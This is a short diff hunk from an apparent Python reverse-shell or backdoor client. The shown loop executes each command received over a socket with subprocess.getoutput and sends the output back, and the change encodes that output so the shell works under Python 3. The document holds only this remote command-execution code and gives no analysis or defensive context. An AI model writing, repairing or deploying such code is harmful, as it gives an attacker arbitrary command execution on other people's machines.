@@ -12,5 +12,5 @@ while True:
         break
     else:
         output = subprocess.getoutput(command)
-        s.send(output)
+        s.send(output.encode())
 s.close()
